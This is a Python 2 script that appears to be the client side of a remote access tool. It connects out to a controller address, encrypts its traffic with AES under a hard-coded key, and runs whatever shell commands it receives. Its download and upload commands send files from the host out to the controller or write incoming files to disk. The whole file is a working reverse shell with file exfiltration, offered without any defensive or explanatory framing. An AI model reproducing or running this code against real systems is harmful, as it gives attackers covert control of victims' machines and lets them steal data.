#!/usr/bin/env python2

import sys
import socket
import subprocess
import Queue
import os
import threading
import time
import shell_commands
from shell_config import *
from Crypto.Cipher import AES
import base64
import time

aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
														#Cryptography stuff
EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))

marker = chr(255)

def connect():
    global comm_socket
    comm_socket = socket.socket()
    comm_socket.connect(("127.0.0.1", 80))
    comm_socket.sendall(EncodeAES("\n"+os.getcwd()+">> "+marker))

while True:
    try:
        connect()
        print "worked"
        break
    except:
        print "Can't connect! Trying again in " + str(sleeptime) + " seconds..."
        time.sleep(sleeptime)


output_queue = Queue.Queue()

class MessageWorker: # Base class for adding a message worker
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix # Prefix used to identify to which worker data should be sent
		self.input_queue = Queue.Queue() # Queue of data to process
		
	def send(self, data, prefix=None):
		if not prefix: prefix = self.data_prefix
		output_queue.put(prefix+data+marker) # Place message on queue to be sent 
		
	def put(self, data):
		self.input_queue.put(data)
		
	def run(self):
		pass
		
class UserInputWorker(MessageWorker):

	def file_shell_to_handler(self, filename):
		with open(filename, "rb") as r:
			for line in r.readlines():
				self.send(base64.b64encode(line))
			self.send("EOF")
				
	def file_handler_to_shell(self, filename):
		with open(filename, "wb") as w:
			while True:
				data = self.input_queue.get()
				if data == "EOF": break
				w.write(base64.b64decode(data))
			
	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			if data.startswith("download"):
				self.file_shell_to_handler(data.split()[1])
				output = "ok"
			elif data.startswith("upload"):
				self.file_handler_to_shell(data.split()[1])
				output = "ok"
			else:
				output = shell_commands.handle_command(data)
			output += "\n"+os.getcwd()+">> "
			self.send(output)
			
class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
	def run(self):
		while True:
			comm_socket.sendall(EncodeAES(output_queue.get()))	
		
workers = []
transmit_worker = TransmitWorker(chr(0)) # Create workers
user_input_worker = UserInputWorker(chr(1))
workers.append(user_input_worker)
workers.append(transmit_worker)

for worker in workers: # Start workers
	t = threading.Thread(target=worker.run)
	t.daemon = True
	t.start()

while True:
	data = ""
	while not data.endswith(marker):
		data += DecodeAES(comm_socket.recv(4096))
	if not data: break
	data = data[:-1] # Get data from shell and remove marker
	
	print data

	for worker in workers:
		if worker.data_prefix == data[0]: # Put data on correct worker's queue
			worker.put(data[1:])
			break
